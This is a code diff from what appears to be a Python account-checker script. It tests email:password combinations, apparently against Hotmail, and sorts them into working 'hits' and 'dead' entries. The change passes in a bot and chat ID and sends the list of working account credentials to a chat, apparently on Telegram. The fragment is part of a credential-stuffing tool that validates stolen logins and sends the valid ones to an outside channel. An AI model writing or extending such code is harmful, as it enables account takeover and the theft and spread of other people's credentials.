@@ -37,7 +37,7 @@ def check_emailpass(emailpass):
             file.write(emailpass)
         return 'Dead', c
 
-def process_hotmail(file_content):
+def process_hotmail(file_content, bot, chat_id):
     emails = file_content.splitlines()
     hits = []
     dead = []
@@ -52,5 +52,12 @@ def process_hotmail(file_content):
             hits.append(message)
         else:
             dead.append(message)
+    
+    # Send hits as a new message
+    if hits:
+        hits_message = "Hit Accounts:\n" + '\n'.join(hits)
+        bot.send_message(chat_id, hits_message)
+    else:
+        bot.send_message(chat_id, "No hit accounts found.")
     
     return total, len(hits), len(dead)
